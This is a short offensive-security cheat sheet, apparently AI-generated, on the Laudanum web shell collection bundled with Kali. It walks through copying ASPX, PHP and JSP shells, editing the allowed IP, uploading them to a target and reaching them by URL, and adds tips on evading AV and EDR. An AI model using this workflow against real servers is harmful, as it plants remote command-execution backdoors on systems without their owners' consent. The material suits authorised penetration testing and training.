# Laudanum

**Tags:** `#laudanum` `#webshells` `#payloads` `#aspx` `#php` `#jsp`

Collection of injectable web shell files for multiple languages (ASPX, PHP, JSP, CFML). Each shell restricts access by IP address — edit to whitelist your attack host before deploying. Pre-installed on Kali.

**Source:** https://github.com/jbarcia/Web-Shells/tree/master/laudanum
**Install:** Pre-installed at `/usr/share/laudanum/`

```bash
ls /usr/share/laudanum/
# aspx/  jsp/  php/  cfm/  ...
```

> [!note]
> Always edit the shell to set your allowed IP before uploading — without it, anyone can use the shell. Copy to working directory first, edit, then upload.

---

## Setup

```bash
# List available shells
ls /usr/share/laudanum/
ls /usr/share/laudanum/aspx/
ls /usr/share/laudanum/php/

# Copy to working directory before editing
cp /usr/share/laudanum/aspx/shell.aspx .
cp /usr/share/laudanum/php/php.php .
```

---

## ASPX Shell (IIS)

```bash
# Copy and edit
cp /usr/share/laudanum/aspx/shell.aspx .

# Edit: set your IP as the allowed host (around line 1-5)
# Look for: String allowedIp = "127.0.0.1";
sed -i 's/127.0.0.1/10.10.14.5/g' shell.aspx
```

Upload to target, then browse to:
```
http://target/uploads/shell.aspx
```

---

## PHP Shell

```bash
cp /usr/share/laudanum/php/php.php .

# Edit allowed IP
# Look for: $allowedIP = array("127.0.0.1");
# Change to your tun0 IP

# Upload and access
curl http://target/uploads/php.php
```

---

## JSP Shell (Tomcat / Java)

```bash
cp /usr/share/laudanum/jsp/cmd.jsp .
# Edit IP restriction, upload to webroot or Tomcat manager
```

---

## What Each Shell Provides

| Feature | Details |
|---------|---------|
| Command execution | Run system commands via input field |
| IP restriction | Only your whitelisted IP can use it |
| File browser | Some variants include directory listing |
| File upload | Some variants support secondary uploads |

---

## Shell Locations on Kali

```
/usr/share/laudanum/aspx/    → shell.aspx, dns.aspx, file.aspx
/usr/share/laudanum/php/     → php.php
/usr/share/laudanum/jsp/     → cmd.jsp
/usr/share/laudanum/cfm/     → cfmshell.cfm
/usr/share/laudanum/          → more variants
```

---

## OPSEC

- Shells write to disk — detectable by file integrity monitoring and AV
- Access from a single IP; avoid browsing from non-whitelisted hosts
- Remove the shell after use
- Laudanum shells are well-known signatures — AV/EDR may flag them; use Antak or a custom shell for evasion

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
